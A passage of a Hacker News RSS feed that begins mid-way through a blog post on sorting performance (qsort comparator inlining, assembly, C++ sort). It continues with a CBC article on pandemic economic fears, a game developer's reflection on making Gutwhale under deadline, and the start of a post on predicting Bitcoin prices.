    <span>else</span>
    <span>{</span>
        <span>*</span><span>(</span><span>uint64_t</span> <span>*</span><span>)</span> <span>tmp</span> <span>=</span> <span>*</span><span>(</span><span>uint64_t</span> <span>*</span><span>)</span> <span>b2</span><span>;</span>
        <span>b2</span> <span>+=</span> <span>sizeof</span> <span>(</span><span>uint64_t</span><span>);</span>
        <span>--</span><span>n2</span><span>;</span>
    <span>}</span>
    <span>tmp</span> <span>+=</span> <span>sizeof</span> <span>(</span><span>uint64_t</span><span>);</span>
<span>}</span>
</code></pre></div></div>

<p>This loop suffers heavily from branch mispredictions, since the “which element is larger” branch is highly unpredictable (at least for random-looking input data). Indeed, we see roughly 128 million mispredicts while sorting ~11 million elements: close to 12 mispredicts per element.</p>

<p>We also note the presence of the indirect call at the <code>call r14</code> line. This corresponds to the <code>(*cmp) (b1, b2, arg)</code> expression in the source: it is calling the user provided comparator function through a function pointer. Since the <code>qsort()</code> code is compiled ahead of time and is found inside the shared libc binary, there is no chance that the comparator, passed as a function pointer, can be inlined.</p>

<p>The comparator function I provide looks like:</p>

<div><div><pre><code><span>int</span> <span>compare_uint64_t</span><span>(</span><span>const</span> <span>void</span> <span>*</span><span>l_</span><span>,</span> <span>const</span> <span>void</span> <span>*</span><span>r_</span><span>)</span> <span>{</span>
    <span>uint64_t</span> <span>l</span> <span>=</span> <span>*</span><span>(</span><span>const</span> <span>uint64_t</span> <span>*</span><span>)</span><span>l_</span><span>;</span>
    <span>uint64_t</span> <span>r</span> <span>=</span> <span>*</span><span>(</span><span>const</span> <span>uint64_t</span> <span>*</span><span>)</span><span>r_</span><span>;</span>
    <span>if</span> <span>(</span><span>l</span> <span>&lt;</span> <span>r</span><span>)</span> <span>return</span> <span>-</span><span>1</span><span>;</span>
    <span>if</span> <span>(</span><span>l</span> <span>&gt;</span> <span>r</span><span>)</span> <span>return</span>  <span>1</span><span>;</span>
    <span>return</span> <span>0</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>which on gcc compiles to branch-free code:</p>

<div><div><pre><code>mov    rax,QWORD PTR [rsi]
mov    edx,0xffffffff
cmp    QWORD PTR [rdi],rax
seta   al
movzx  eax,al
cmovb  eax,edx
ret
</code></pre></div></div>

<p>Note that the comparator has to redundantly load from memory the two locations to compare, something the merge loop already did (the merge loop reads them because it is responsible for moving the elements).</p>

<p>How much better could things get if we inline the comparator into the merge loop? That’s what we do in <code>qsort-inlined</code><sup id="fnref:inline-hard" role="doc-noteref"><a href="#fn:inline-hard">6</a></sup>, and here’s the main loop which now includes the comparator function<sup id="fnref:cmdline1" role="doc-noteref"><a href="#fn:cmdline1">7</a></sup> :</p>

<pre><code> 0.07 :   401dc8:       test   rbp,rbp
 0.66 :   401dcb:       je     401e0c &lt;void msort_with_tmp&lt;CompareU64&gt;(msort_param const*, void*, unsigned long, CompareU64)+0xbc&gt;
 3.51 :   401dcd:       mov    rax,QWORD PTR [r9]
 5.00 :   401dd0:       lea    rdx,[rbx+0x8]
 1.62 :   401dd4:       mov    rcx,QWORD PTR [rbx]
 0.24 :   401dd7:       lea    r8,[r9+0x8]
 6.96 :   401ddb:       cmp    rax,rcx
20.83 :   401dde:       cmovbe r9,r8
 8.88 :   401de2:       cmova  rbx,rdx
 0.27 :   401de6:       cmp    rcx,rax
 6.23 :   401de9:       sbb    r8,r8
 0.74 :   401dec:       cmp    rcx,rax
 4.93 :   401def:       sbb    rdx,rdx
 0.24 :   401df2:       not    r8
 6.69 :   401df5:       add    rbp,rdx
 0.44 :   401df8:       cmp    rax,rcx
 5.34 :   401dfb:       cmova  rax,rcx
 5.96 :   401dff:       add    rdi,0x8
 7.48 :   401e03:       mov    QWORD PTR [rdi-0x8],rax
 0.00 :   401e07:       add    r15,r8
 0.71 :   401e0a:       jne    401dc8 &lt;void msort_with_tmp&lt;CompareU64&gt;(msort_param const*, void*, unsigned long, CompareU64)+0x78&gt;
</code></pre>

<p>A key difference is that the core of the loop is now branch free. Yes, there are still two conditional jumps, but they are both just checking for the termination condition (that one of the lists to merge is exhausted), so we expect this loop to be free of branch mispredictions other than the final iteration. Indeed, we measure with <code>perf stat</code> that the misprediction rate has dropped from to close to 12 mispredicts per element to around 0.75 per element. The loop has only two loads and one store, so the memory access redundancy between the merge code and the comparator has been eliminated<sup id="fnref:load-redundancy" role="doc-noteref"><a href="#fn:load-redundancy">8</a></sup>. Finally, the comparator does a three-way compare (returning distrinct results for <code>&lt;</code>, <code>&gt;</code> and <code>==</code>), but the merge code only needs a two-way compare (<code>&lt;=</code> or <code>&gt;</code>) - inlining the comparator manages to remove extra code associated with distinguishing the <code>&lt;</code> and <code>==</code> cases.</p>

<p>What’s the payoff? It’s pretty big:</p>

<p><img src="https://travisdowns.github.io/assets/2019-05-22/fig2.svg" alt="Effect of comparator inlining"></p>

<p>The speedup hovers right around 1.77x. Note that this is much larger than simply eliminating all the time spent in the separate comparator function in the original version (about 17% of the time implying a speedup of 1.2x if all the function time disapeared). This is a good example of how inlining isn’t just about removing function call overhead but enabling further <em>knock on</em> optimizations which can have a much larger effect than just removing the overhead associated with function calls.</p>

<h2 id="what-about-c">What about C++?</h2>

<p>Short of copying the existing glibc (note: LGPL licenced) sorting code to allow inlining, what else can we do to speed things up? I’m writing in C++, so how about the C++ sort functions available in the <code>&lt;algorithm&gt;</code> header? Unlike C’s <code>qsort</code> which is generic by virtue of taking a function pointer and information about the object size, the C++ sort functions use templates to achieve genericity and so are implemented directly in header files. Since the sort code and the comparator are being compiler together, we expect the comparator to be easily inlined, and perhaps other optimizations may occur.</p>

<p>Without further ado, let’s just throw <code>std::sort</code>, <code>std::stable_sort</code> and <code>std::partial_sort</code> into the mix:</p>

<p><img src="https://travisdowns.github.io/assets/2019-05-22/fig3.svg" alt="C vs C++ sort functions"></p>

<p>The C++ sort functions, other than perhaps <code>std::partial_sort</code><sup id="fnref:partial-sort" role="doc-noteref"><a href="#fn:partial-sort">9</a></sup>, put in a good showing. It is interesting that <code>std::stable_sort</code> which has <em>stricly more requirements</em> on its implementation than <code>std::sort</code> (i.e., any stable sort is also suitable for <code>std::sort</code>) ends up faster. I re-wrote this paragaph several times, since sometimes after a reboot <code>stable_sort</code> was slower and sometimes it was faster (as shown above). When it was “fast” it had less than 2% branch mispredictions, and when it was slow it was at 15%. So perhaps there was some type of aliasing issue in the branch predictor which depends on the physical addresses assigned, which can vary from run to run, I’m not sure. See <sup id="fnref:stablesort" role="doc-noteref"><a href="#fn:stablesort">10</a></sup> for an old note from when <code>std::stable_sort</code> was slower.</p>

<h2 id="can-we-do-better">Can we do better?</h2>

<p>So that’s as fast as it gets, right? We aren’t going to beat <code>std::sort</code> or <code>std::stable_sort</code> without a huge amount of effort, I think? After all, these are presumably highly optimized sorting routines written by the standard library implementors. Sure, we might expect to be able to beat <code>qsort()</code>, but that’s mostly because of built-in disadvantages that <code>qsort</code> has, lacking the ability to inline the comparator, etc.</p>

<h3 id="radix-sort-attempt-1">Radix Sort Attempt 1</h3>

<p>Well, one thing we can try is a non-comparison sort. We know we have integer keys, so why stick to comparing …</p></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://travisdowns.github.io/blog/2019/05/22/sorting.html">https://travisdowns.github.io/blog/2019/05/22/sorting.html</a></em></p>]]>
            </description>
            <link>https://travisdowns.github.io/blog/2019/05/22/sorting.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25783617</guid>
            <pubDate>Thu, 14 Jan 2021 22:25:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Sourcehut blog condeming Trump and supporters]]>
            </title>
            <description>
<![CDATA[
Score 27 | Comments 26 (<a href="https://news.ycombinator.com/item?id=25783454">thread link</a>) | @lumpa
<br/>
January 14, 2021 | https://lists.sr.ht/~sircmpwn/sr.ht-discuss/%3CfaFmBHWTBbMkA8x8iTLj4srJ4wlAXXKoOQKOAk5ZXI%40cp3-web-024.plabs.ch%3E | <a href="https://web.archive.org/web/*/https://lists.sr.ht/~sircmpwn/sr.ht-discuss/%3CfaFmBHWTBbMkA8x8iTLj4srJ4wlAXXKoOQKOAk5ZXI%40cp3-web-024.plabs.ch%3E">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://lists.sr.ht/~sircmpwn/sr.ht-discuss/%3CfaFmBHWTBbMkA8x8iTLj4srJ4wlAXXKoOQKOAk5ZXI%40cp3-web-024.plabs.ch%3E</link>
            <guid isPermaLink="false">hacker-news-small-sites-25783454</guid>
            <pubDate>Thu, 14 Jan 2021 22:12:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Global economy faces fears of a 'lost decade' as Covid-19 cases surge]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25782611">thread link</a>) | @mgh2
<br/>
January 14, 2021 | https://www.cbc.ca/news/business/global-economy-slower-recovery-covid-19-1.5861968 | <a href="https://web.archive.org/web/*/https://www.cbc.ca/news/business/global-economy-slower-recovery-covid-19-1.5861968">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Attempts to keep the economy open while fighting the coronavirus face new challenges from mutating COVID-19 variants, as the World Bank expresses concerns about financial stress for countries that failed to get on top of the pandemic early.</p><div><figure><div><p><img loading="lazy" alt="" srcset="" sizes="" src="https://i.cbc.ca/1.5862478.1609885138!/cpImage/httpImage/image.jpg_gen/derivatives/16x9_780/ont-covid-retail-20201219.jpg"></p></div><figcaption>The doors of a Hudson's Bay department store in Toronto remained closed to in-store Christmas shoppers in December due to strict COVID-19 measures in Ontario's hot spots. Some observers are suggesting that the vaccine rollout may not bring an economic recovery before year's end.<!-- --> <!-- -->(Chris Young/The Canadian Press)</figcaption></figure><p><span><p>Optimism that the early arrival of a vaccine meant that the global economy would be out of the woods in 2021 is facing a rethink as COVID-19 resurges and mutates.</p>  <p>There remains every possibility that an efficient rollout of the vaccine in Canada and elsewhere really will lead to signs of a recovery well before the end of this year. But there are voices suggesting that the pandemic may hold more bad news in store.</p>  <p>Certainly the year's first day of market trading was less than auspicious.</p>  <p>"Stocks hit records early in the session as investors focused on the rollout of COVID-19 vaccines," Reuters reported. "But investors quickly turned cautious over the path of the virus, which continues to spread amid the discovery of a new variant."</p>  <p>It is never a good idea to put too much stock in a single day's trading or <u><a href="https://www.cbc.ca/news/business/simple-explanations-for-market-ups-and-downs-often-prove-unreliable-don-pittis-1.5610209" target="_blank">the instant analysis of sudden market moves</a></u>, but Monday's decline — which&nbsp;saw a fall in the technology-heavy Nasdaq market of nearly three&nbsp;per cent — added to a feeling of unease.</p>  <h2>Triggering tighter restrictions</h2>  <p>"As the new COVID-19 strain triggers tighter restrictions on economic activity and limits even more the movement of people, it has become increasingly clear that the road to vaccine-induced immunity will now have more potholes," Mohamed El-Erian, a well-known U.S. adviser to financial corporations who is now president of Queen's College, Cambridge, wrote in <u><a href="https://twitter.com/FinancialTimes/status/1346358293183258624" target="_blank">Tuesday's Financial Times</a></u>.</p>  <p>El-Erian worried that the struggle to recover from the pandemic's economic impact would lead to misguided efforts by countries toward a "further weaponization of trade tariffs" and a destabilizing polarization in politics and income.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5862121.1609876409!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/health-coronavirus-britain.jpg 300w,https://i.cbc.ca/1.5862121.1609876409!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/health-coronavirus-britain.jpg 460w,https://i.cbc.ca/1.5862121.1609876409!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/health-coronavirus-britain.jpg 620w,https://i.cbc.ca/1.5862121.1609876409!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/health-coronavirus-britain.jpg 780w,https://i.cbc.ca/1.5862121.1609876409!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/health-coronavirus-britain.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5862121.1609876409!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/health-coronavirus-britain.jpg"></p></div><figcaption>Ambulances line up in London on Tuesday, where a more virulent strain of COVID-19 has contributed to a renewed outbreak and new economic closures. Case and death rates in regions that remained largely open mean places such as Britain have faced growing pressure to take stronger action.<!-- --> <!-- -->(Hannah McKay/Reuters)</figcaption></figure></span></p>  <p>Virologists warn of not just a single new strain&nbsp;but a series of continuing mutations as the disease spreads around the world, constantly evolving through accidental changes in its genetic makeup. Then, as we have already seen, the most virulent versions out-compete their viral cousins to sweep back out and around the world.</p>  <p>With luck, the faster-spreading mutations will be no worse — and could theoretically be milder. But some scientists in the United Kingdom have warned that current vaccines may not be as effective on one new variant in South Africa.</p>    <p>The more virulent European version has already turned up in the United States and Canada. As of this writing, the one found in South Africa has not yet been spotted here, but experience with previous transmission waves implies its arrival is inevitable.</p>  <p>Meanwhile, the idea that countries and regions can fight the virus while keeping the economy intact is facing contradictory evidence.</p>  <p>Case and death rates in regions that remained largely open&nbsp;mean places such as&nbsp;Britain and the U.S.&nbsp;have faced increasing public pressure to take stronger action, even as the economy weakens. Places that imposed severe lockdowns earlier in the battle against the pandemic, such as Australia and China, have seen relative economic success.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5862120.1609887256!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/health-coronavirus-safrica.jpg 300w,https://i.cbc.ca/1.5862120.1609887256!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/health-coronavirus-safrica.jpg 460w,https://i.cbc.ca/1.5862120.1609887256!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/health-coronavirus-safrica.jpg 620w,https://i.cbc.ca/1.5862120.1609887256!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/health-coronavirus-safrica.jpg 780w,https://i.cbc.ca/1.5862120.1609887256!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/health-coronavirus-safrica.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5862120.1609887256!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/health-coronavirus-safrica.jpg"></p></div><figcaption>Police patrol the streets of Johannesburg on Jan. 1 during a curfew imposed after a new variant of the coronavirus was found. Some scientists in the U.K. have warned that current vaccines may not be as effective on the variant in South Africa.<!-- --> <!-- -->(Siphiwe Sibeko/Reuters)</figcaption></figure></span></p>  <h2>World Bank worries about debt, education breakdown</h2>  <p>China's economic data is commonly disputed, but the World Bank suggests growth in the country will rebound to about eight&nbsp;per cent this year.</p>  <p>In its newly released <a href="https://www.worldbank.org/en/publication/global-economic-prospects" target="_blank">Global Economic Prospects</a> report for 2021, the World Bank fears a lingering impact from the virus — what it warned could be a "lost decade," especially for countries that failed to get on top of the pandemic early.</p>    <p>"Many countries are expected to lose a decade or more of per-capita income gains," the World Bank report said. "Downside risks include the possibility of a further resurgence of the virus, more severe effects on potential output from the pandemic&nbsp;and financial stress."</p>  <p>Besides the immediate damage to the economy caused by interruptions to trade, domestic commercial activity and job losses, the World Bank worries that such factors as a huge piling up of public and private debt and a breakdown in education will lead to a prolonged deterioration in economic prospects.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5862122.1609880954!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/health-coronavirus-canada.jpg 300w,https://i.cbc.ca/1.5862122.1609880954!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/health-coronavirus-canada.jpg 460w,https://i.cbc.ca/1.5862122.1609880954!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/health-coronavirus-canada.jpg 620w,https://i.cbc.ca/1.5862122.1609880954!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/health-coronavirus-canada.jpg 780w,https://i.cbc.ca/1.5862122.1609880954!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/health-coronavirus-canada.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5862122.1609880954!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/health-coronavirus-canada.jpg"></p></div><figcaption>A nearly empty Pearson International Airport in Toronto on Dec. 30. In parts of Canada and in the U.K., calls for stricter measures — including more severe limits on travel intended to combat the spread of COVID-19 — make hopes for an economic rebound in 2021 seem less certain.<!-- --> <!-- -->(Carlos Osorio/Reuters)</figcaption></figure></span></p>  <p>In parts of Canada and in the U.K., calls for stricter measures — including more severe limits on travel intended to combat holiday-induced spread and growing pressure on hospitals — mean earlier hopes that the autumn rebound would continue&nbsp;into 2021 seem less certain.</p>  <p>Although they may be distorted by the holidays, jobs data for both the U.S. and Canada are due on Friday and will offer the freshest possible update on whether the slow but steady uptick in the Canadian economy has stalled.</p>    <p>Gross domestic product figures released two weeks ago showed that growth has continued to creep up ever since April's big dip. If that continues, it won't strictly be <u><a href="https://www.cbc.ca/news/business/economic-recovery-letters-analysis-1.5574372" target="_blank">a V-shaped recovery</a></u>, but maybe a V written by a four-year-old that stretches out a bit too far to the right.</p>  <p>That may have changed. The GDP data was from October when everyone was far more optimistic, whereas Statistics Canada collected the December jobs data that we'll see on Friday just weeks ago.</p>  <p>Those employment figures may offer a first hint if the right-hand bar of the V has jogged down, making it into something closer to a W — the potential indicator of a double-dip recession.</p>  <p><em><strong>WATCH | Making vital supplies became saviour for manufacturers during pandemic:</strong></em></p>  <p><span><span><div><div title="Making vital supplies during the pandemic became a saviour for Canadian manufacturing" role="button" tabindex="0"><div><div aria-labelledby="1839453763522-metadata-" title="Making vital supplies during the pandemic became a saviour for Canadian manufacturing"><div><p><img src="https://thumbnails.cbc.ca/maven_legacy/thumbnails/128/830/pandemic-manufacturing-shift-armstrong-010121.jpg" alt="" loading="lazy"></p></div></div></div></div></div><span>As the pandemic ramped up, Canada's manufacturing sector nimbly shifted gears and started making products to keep people safe from COVID-19. Even among manufacturers, it reminded people what happens when a country makes its own necessary goods.<!-- --> <!-- -->2:09</span></span></span></p>  <p>Follow Don Pittis&nbsp;on Twitter: @don_pittis</p></span></p></div></div>]]>
            </description>
            <link>https://www.cbc.ca/news/business/global-economy-slower-recovery-covid-19-1.5861968</link>
            <guid isPermaLink="false">hacker-news-small-sites-25782611</guid>
            <pubDate>Thu, 14 Jan 2021 21:11:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Goodbye Gutwhale (2020)]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25782307">thread link</a>) | @BobbyVsTheDevil
<br/>
January 14, 2021 | http://stuffedwomb.at/goodbye_gutwhale | <a href="https://web.archive.org/web/*/http://stuffedwomb.at/goodbye_gutwhale">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <p><a href="http://stuffedwomb.at/thinking">back</a></p>

<div><p>Finally, almost 3 months after it released, I can stop thinking about Gutwhale.</p><p>
<em>This is the edited script of a talk I gave for the Game Dev Days 2020.</em></p></div>

<p><strong>Content</strong></p>
<ul>
  <li>the endles gamejam</li>
  <li>the call to action</li>
  <li>the important thing</li>
  <li>the power of deadlines</li>
  <li>the cost of deadlines</li>
  <li>the nice things</li>
  <li>conclusion</li>
</ul>



<h2>the endless gamejam</h2>

<div><p>A few years ago I only did gamejams.<br> 
Gamejams are essentially deadlines, forcing you finish something. <br>
I also did a lot of short jams alone, where i would sit down and give myself 30 minutes to make a prototype.<br>
Many of the gifs I post on twitter are the results of these solo jams.</p><p> 

This helped me to learn to code and to design and to schedule, but over time I found that simply making stuff was not enough anymore.</p><p>
What I really love is doing something new. <br>
Something that has not existed before.<br>
Finding a new angle on an old problem brings me an intense, deep joy that is really hard to describe.</p><p>

There is a lot of unexplored space in games and what I am currently really interested in is <strong>expression</strong>:<br>
How do I tell a story through a game? </p><p>
How do I communicate how I feel through videogames? </p><p>
Its really hard and kind of stupid, considering that videogames are all about endless repetition in closed systems, but its what i want to explore right now.</p><p>

And I explored it at my own pace while working as a receptionist, making games like <a href="https://www.google.com/">Up in the sky</a> and <a href="https://www.google.com/">Every Wall</a>.
</p></div>

<h2>the important thing</h2>
<div><p>There is a game developer called <a href="https://twitter.com/miziziziz">miziziziz</a>, one of the few who makes watchable youtube videos, 
who made a commercial game called <a href="https://store.steampowered.com/app/1232330/Theyest_Thou">Theyes Thou</a> in one month.</p><p>

When I lost my job as a receptionist because of the coronavirus, I decided to steal that idea.<br>
Since I am not overly interested in traditional FUN game design, I needed to make something that felt new to me. <br>
I needed to make a game that actually said something about the world we move through everyday. Just making an entertainment box would have been too boring and unfocused. </p><p>

But since I was unemployed I felt like I needed to make something that at least had a shot at commercial viability. One month is not a lot of time, but I needed to come up with something that people would also want to pay for.
<br>
The roguelike we ended up making contains a short section at the end where I try to actually say something, where I try to express myself. This part of the game was important to me, the rest was just decorations. <br>
I wanted people to buy the game because it looked like a nice little roguelike, and then, in the end, I wanted them to engage with this secret part of the game that was actually important to me. </p><p>

And I had one month to make that real.</p></div>

<h2>the power of deadlines</h2>
<p>Gutwhale is a product of its deadline.<br> 
All of it was made in the easiest way possible. The code is a mess of course, but I want to talk more about the decisions, forced upon us by the deadline, that permeate the whole project:<br></p>

<ul>
  <li>
    <p>Gutwhale is only called Gutwhale because the project needed an artist.
<a href="https://twitter.com/franek">Franek</a> is very good at making pixelart and he, for whatever reason, also loves to draw whales. So when he was on the fence about joining the project, I quickly changed the setting to take place inside of a whale. This does not make a lot of sense, but Franek got to draw a whale and the game had an artist.
<br></p>
  </li>
  <li>
    <p>Gutwhale used to take place on a single screen, because then I would not have to write a camera system. When it turned out that a single screen was pretty boring, we just glued multiple single screens together and make the floor break once all enemies were defeated. The core loop of Gutwhale was born out of not wanting to code a camera system.
<br></p>
  </li>
  <li>
    <p>The small size of the Levels themselves helped me in a lot of ways. The level generation code does not need to consider unreachable platforms and could be hacked together violently. Because there is so little space to move around in, enemies become more dangerous and I needed to code less of them to fill the game.<br></p>
  </li>
</ul>

<p>The deadline forced me to think quickly and to design dirtily, accidentally disovering some pretty neat things.<br>
It certainly has also hurt the game in a lot of ways.
<br></p>

<h2>the cost of deadlines</h2>

<p>Gutwhale is unbalanced in both directions. <br></p>

<div><p>For people with little to no platformer roguelike experience, it is extremely hard.minutes and then give up, never to touch the game again.</p><p>

For people who played downwell and gonner, it is a piece of cake and they can 100% the game in around 20 minutes. There is an endless nightmare mode, but it did not have an engaging highscore system, so the best players of Gutwhale quickly got bored.</p><p>

The save system of Gutwhale had horrible bugs and there were technical problems all over the place, prohibitung us from implementing Achievements and updating the game easily.<br>
We used Construct 2, an engine that is no longer supported by its developers in favour of Construct 3. This made it impossible to add Steam Achievements and created some other technical problems.
<br>
And these problems are just that: <br>
Problems. </p><p>

They exist because we rushed through development at an insane speed and I can forgive myself for making them, because I was actually focusing on this one secret thing at the end.
</p><p>
<strong>BUT</strong></p><p>
The part of the game that is most important to me, the ending, is also not working as intended. I was unable to clearly communicate what I wanted to communicate. 
<br>
There was not enough time to conduct long term playtests and interview players about how they perceived the ending.<br>
There was not enough time for me to really reflect and ponder and tweak and adjust the ending of Gutwhale.<br>
I started the project as a compromise between compelling gameplay and a secret, expressive part, which enabled me to keep working on the game.<br>
And that part did not work. It did not resonate. <br>
At least it feels like that to me now.</p></div>

<h2>the nice things</h2>

<p>Gutwhale was a success overall: <br></p>
<ul>
  <li>
    <p>It made me more money than I would have earned at my previous job, but not nearly enough to not have to go back to that job in 7 days.<br></p>
  </li>
  <li>
    <p>It may make substantially more money on consoles or in bundles in the future.</p>
  </li>
  <li>
    <p>It gave me a better understanding of how to sell stuff on steam.</p>
  </li>
  <li>
    <p>and last but defenitly not least, I got to work with Franek, Britt Brady and Clovelt who have thaught me a lot and are amazing people.
<br></p>
  </li>
</ul>

<h2>conclusion</h2>

<div><p>Finishing games is hard. <br>
Really hard. <br>
As a way to deal with this, a series of game jams has been created, where speed is key and the end product is only as important as the fact that it got finished.<br>
We have seen amazing games made in insanely short times and countless people have been able to dabble in game dev because of the contained nature of game jams.</p><p>

<strong>BUT</strong></p><p>
Applying this need for speed to bigger projects creates dynamics that should not be confused with efficiency and skill.</p><p>

The core part of Gutwhale, the one thing I was truly interested in, withered and died because of the deadline, because we were so wrapped up in getting the game done. <br>
There was simply not enough time to stop and smell the flowers.<br>
The deadline mercilessly  and in cold blood, pulled us away from being able to express ourselves.</p><p>

Gutwhale is nice and I am proud of it, but i think it is time for me to force myself to move on to a different way of development.</p><p>

When i did not know what I wanted express through the games I make, when i just wanted to MAKE, I needed frameworks to support me, to force me to do the work and to put in the hours, but after years of doing that, those structures have started to feel inhibiting in the best way possible. <br>
They are still able to teach me and to challenge me, but in the end, they are also keeping me from moving towards, to where I want to go, to do what I want to create.<br>
Deadlines keep me from really reflecting and looking at myself. They keep me from thinking about what i want to express through my work and they keep me from then actually saying that.</p></div>

<p><a href="https://store.steampowered.com/app/1267810/Gutwhale/">Gutwhale´s Steampage</a></p>

<p><a href="http://stuffedwomb.at/thinking">back</a></p>


      
    </div></div>]]>
            </description>
            <link>http://stuffedwomb.at/goodbye_gutwhale</link>
            <guid isPermaLink="false">hacker-news-small-sites-25782307</guid>
            <pubDate>Thu, 14 Jan 2021 20:52:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Will Bitcoin go up or down?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25782222">thread link</a>) | @andr3w321
<br/>
January 14, 2021 | https://sellthedip.com/will-bitcoin-will-go-up-or-down/ | <a href="https://web.archive.org/web/*/https://sellthedip.com/will-bitcoin-will-go-up-or-down/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-182">
	<!-- .entry-header -->

	<div>
		
<p>The way I think about whether Bitcoin price is going to rise or fall is by thinking about Bitcoin flows.</p>



<figure><a href="https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Fraud-Diagram2.jpg?ssl=1"><img loading="lazy" width="656" height="405" src="https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Fraud-Diagram2.jpg?resize=656%2C405&amp;ssl=1" alt="" srcset="https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Fraud-Diagram2.jpg?resize=1024%2C632&amp;ssl=1 1024w, https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Fraud-Diagram2.jpg?resize=300%2C185&amp;ssl=1 300w, https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Fraud-Diagram2.jpg?resize=768%2C474&amp;ssl=1 768w, https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Fraud-Diagram2.jpg?resize=1536%2C948&amp;ssl=1 1536w, https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Fraud-Diagram2.jpg?resize=2048%2C1265&amp;ssl=1 2048w, https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Fraud-Diagram2.jpg?w=1312&amp;ssl=1 1312w, https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Fraud-Diagram2.jpg?w=1968&amp;ssl=1 1968w" sizes="(max-width: 656px) 100vw, 656px" data-recalc-dims="1"></a></figure>



<p>Predicting Bitcoin’s price is relatively easy and straightforward if you know the dollar amounts of all the flows at all times.</p>



<p>If Bitcoin inflows &gt; Bitcoin outflows then Bitcoin price will rise to meet demand.<br>If Bitcoin outflows &gt; Bitcoin inflows then Bitcoin price will fall to meet demand.</p>



<p>Unfortunately, <strong>1) USD inflows and outflows</strong> are impossible to know without getting proprietary exchange data on deposits and withdrawals. The best alternative I’ve found is using something like google trends data to gauge sentiment. When people are googling “bitcoin” a lot, that means there is probably a lot of USD demand for bitcoin at any given time.</p>



<figure><a href="https://i0.wp.com/sellthedip.com/wp-content/uploads/2021/01/Bitstamp-bitcoin-price-vs-bitcoin-google-trends.jpg?ssl=1"><img loading="lazy" width="656" height="546" src="https://i0.wp.com/sellthedip.com/wp-content/uploads/2021/01/Bitstamp-bitcoin-price-vs-bitcoin-google-trends.jpg?resize=656%2C546&amp;ssl=1" alt="" srcset="https://i0.wp.com/sellthedip.com/wp-content/uploads/2021/01/Bitstamp-bitcoin-price-vs-bitcoin-google-trends.jpg?resize=1024%2C853&amp;ssl=1 1024w, https://i0.wp.com/sellthedip.com/wp-content/uploads/2021/01/Bitstamp-bitcoin-price-vs-bitcoin-google-trends.jpg?resize=300%2C250&amp;ssl=1 300w, https://i0.wp.com/sellthedip.com/wp-content/uploads/2021/01/Bitstamp-bitcoin-price-vs-bitcoin-google-trends.jpg?resize=768%2C640&amp;ssl=1 768w, https://i0.wp.com/sellthedip.com/wp-content/uploads/2021/01/Bitstamp-bitcoin-price-vs-bitcoin-google-trends.jpg?w=1200&amp;ssl=1 1200w" sizes="(max-width: 656px) 100vw, 656px" data-recalc-dims="1"></a></figure>



<p><a href="https://trends.google.com/trends/explore?date=today%205-y&amp;geo=US&amp;q=bitcoin">https://trends.google.com/trends/explore?date=today%205-y&amp;geo=US&amp;q=bitcoin</a></p>



<p>Fortunately <strong>2) Tether buyers and sellers</strong> and <strong>3) Miner Revenue</strong> are known, published values that can be looked up easily. We can use these to create an incomplete, real time model of Bitcoin flows to predict future Bitcoin prices.</p>



<p><strong>Tether buyers and sellers</strong></p>



